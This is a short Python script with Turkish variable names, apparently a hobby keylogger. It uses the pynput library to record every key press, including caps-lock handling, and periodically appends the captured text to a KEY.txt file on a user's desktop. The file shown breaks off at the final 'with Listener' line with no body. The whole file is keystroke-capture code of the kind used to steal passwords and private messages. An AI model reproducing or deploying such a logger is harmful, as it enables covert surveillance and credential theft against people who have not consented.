from pynput.keyboard import Listener,Key

liste=list()
capsdurum=False

def bas(key):
    global liste,capsdurum

    try:
        if capsdurum:
            liste.append(key.char.upper())
        else:
            liste.append(key.char)                
        
    except:
        if key==Key.space:
            liste.append(" ")
        if key==Key.enter:
            liste.append("\n")
        if key==Key.backspace:
            liste.append("'<'")
        if key==Key.caps_lock:
            if capsdurum:
                capsdurum=False
            else:
                capsdurum=True



    if len(liste)>=30:
        dosya_yaz()
        liste=list()

def birak(key):

    pass


def dosya_yaz():
    global liste

    with open("C:/Users/Casper/Desktop/KEY.txt","a", encoding="utf8") as dosya:
        for x in liste:
            dosya.write(x)
            
with Listener(on_press=bas, on_release=birak) as dinleyici:

